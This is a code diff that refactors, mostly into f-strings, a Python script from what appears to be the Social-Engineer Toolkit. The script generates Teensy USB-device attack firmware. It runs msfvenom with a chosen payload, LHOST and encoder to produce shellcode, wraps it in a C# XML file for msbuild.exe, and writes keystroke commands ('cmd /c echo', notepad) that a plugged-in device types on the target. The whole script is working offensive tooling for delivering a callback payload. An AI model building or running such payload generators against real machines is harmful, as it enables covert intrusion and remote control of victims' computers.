@@ -41,15 +41,15 @@ xml_input_filename = '/usr/share/setoolkit/src/teensy/ino_build_file.xml'       
 
 # User selection - default values
 print('\n-----default settings for shellcode generation-----\n')
-print('LHOST                           - '+lhost_ipaddr)
-print('Shell Architecture              - '+shell_arch)
-print('Shell platform                  - '+shell_plat)
-print('Payload                         - '+payload)
-print('Encapsulation                   - '+encap)
+print(f'LHOST                           - {lhost_ipaddr}')
+print(f'Shell Architecture              - {shell_arch}')
+print(f'Shell platform                  - {shell_plat}')
+print(f'Payload                         - {payload}')
+print(f'Encapsulation                   - {encap}')
 print('\n-----default settings for C# XML file-----\n')
-print('User variable for file location - '+enviro_var)
-print('XML Output filename             - '+xml_output_filename)
-print('Location of msbuild.exe         - '+build_path+'\n')
+print(f'User variable for file location - {enviro_var}')
+print(f'XML Output filename             - {xml_output_filename}')
+print(f'Location of msbuild.exe         - {build_path}' + '\n')
 
 # User selection - Choices
 change_settings = input("\nWould you like to change the default settings (y/n)")
@@ -69,36 +69,41 @@ else:
 
 with open(ino_output_filename,'wb') as ino_output_file:                     # Open the ino output file as a write to receive the formatted text.
     if os.path.isfile(ino_header_filename):
-        with open(ino_header_filename,'rb') as ino_header_file:             # Open the ino header file as readonly.
+        with open(ino_header_filename,'rb') as ino_header_file:     # Open the ino header file as readonly.
             print('-----Formatting ino header file-----')                    # Progress notification to the user.
-            for ino_header_line in ino_header_file:                         # Read each line from the file.
+            for ino_header_line in ino_header_file:             # Read each line from the file.
                 ino_header_line = ino_header_line.rstrip()                  # Strip the formatting on the rhs of each line.
                 if ( ino_header_line == '-----create-----'):                # Check for the presence of the create label.
                     ino_output_file.writelines( teensy_gen.cmd_at_run_gen('cmd /c echo 0 >',enviro_var,xml_output_filename) + '\n' )  # Insert create command into the location defined by the label.
+                elif ( ino_header_line == '-----notepad-----'):           # Check for the presence of the notepad label.
+                    ino_output_file.writelines( teensy_gen.cmd_at_run_gen('notepad',enviro_var,xml_output_filename) + '\n' ) # Insert notepad command into the location defined by the label.
                 else:
-                    if ( ino_header_line == '-----notepad-----'):           # Check for the presence of the notepad label.
-                        ino_output_file.writelines( teensy_gen.cmd_at_run_gen('notepad',enviro_var,xml_output_filename) + '\n' ) # Insert notepad command into the location defined by the label.
-                    else:
-                        ino_output_file.writelines( ino_header_line + '\n' )    # Write the ino header line to the ino file.
+                    ino_output_file.writelines( ino_header_line + '\n' )    # Write the ino header line to the ino file.
 
         ino_header_file.close()                                             # Close the ino header file.
     else:
-        sys.exit('-----Exiting file - '+ino_header_filename+' does not exist-----')
+        sys.exit(f'-----Exiting file - {ino_header_filename} does not exist-----')
 
     ino_output_file.writelines( '\n' )                                      # Create new line in the ino_output_file.
 
     if os.path.isfile(xml_input_filename):
-        with open(xml_input_filename,'rb') as xml_include_file:             # Open the XML file.
+        with open(xml_input_filename,'rb') as xml_include_file:     # Open the XML file.
             print('-----Formatting XML file for ino file-----')              # Progress notification to the user.
-            for input_line in xml_include_file:                             # Read each line from the file.
+            for input_line in xml_include_file:                 # Read each line from the file.
                 input_line = input_line.rstrip()                            # Strip the formatting on the rhs of each line.
                 input_line = input_line.replace("\\", "\\\\")               # Escape the \ in each line using \\.
                 input_line = input_line.replace("\"", "\\\"")               # Escape the " in each line using \".
 
-                if ( input_line == '-----shellcode-----'):                  # Check for the presence of the shellcode label.
+                if ( input_line == '-----shellcode-----'):  # Check for the presence of the shellcode label.
                     # generate the shellcode using msfvenom
                     print('-----Generating shellcode-----')                  # Progress notification to the user.
-                    proc = subprocess.Popen("%smsfvenom -a %s --platform %s -p %s LHOST=%s -e %s -f %s -v shellcode" % (meta_path,shell_arch,shell_plat,payload,lhost_ipaddr,encap,shell_format), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    proc = subprocess.Popen(
+                        f"{meta_path}msfvenom -a {shell_arch} --platform {shell_plat} -p {payload} LHOST={lhost_ipaddr} -e {encap} -f {shell_format} -v shellcode",
+                        shell=True,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        stdin=subprocess.PIPE,
+                    )
 
                     # read in the generated shellcode using stdout
                     payload_shellcode = proc.stdout.read()                  # assign the output of stdout to the variable payload_shellcode.
@@ -106,7 +111,9 @@ with open(ino_output_filename,'wb') as ino_output_file:                     # Op
                     payload_shellcode = payload_shellcode.strip()           # Strip formatting from the payload.
 
                     print('-----Formatting shellcode for ino file-----')     # Progress notification to the user.
-                    ino_output_file.writelines( teensy_gen.ino_print_gen(payload_shellcode[0:34] ) + '\n' )  # format first line as shorter than rest.
+                    ino_output_file.writelines(
+                        teensy_gen.ino_print_gen(payload_shellcode[:34]) + '\n'
+                    )
 
                     while (start_pos <= length):                            # format the remaning lines of shellcode.
                         end_pos = start_pos + width                         # Set the position of end_pos.
@@ -120,7 +127,7 @@ with open(ino_output_filename,'wb') as ino_output_file:                     # Op
         xml_include_file.close()                                            # Close the XML file.
 
     else:
-        sys.exit('-----Exiting file - '+xml_input_filename+' does not exist-----')
+        sys.exit(f'-----Exiting file - {xml_input_filename} does not exist-----')
 
     if os.path.isfile(ino_tail_filename):
         with open(ino_tail_filename,'rb') as ino_tail_file:                 # Open the ino tail file.
@@ -137,6 +144,6 @@ with open(ino_output_filename,'wb') as ino_output_file:                     # Op
         print('-----Finished creating ino file ino_file_gen.ino-----')       # Progress notification to the user.
         user_return = input("Please press any key")
     else:
-        sys.exit('-----Exiting file - '+ino_tail_filename+' does not exist-----')
+        sys.exit(f'-----Exiting file - {ino_tail_filename} does not exist-----')
 
 ino_output_file.close()                                                     # Close the ino file.
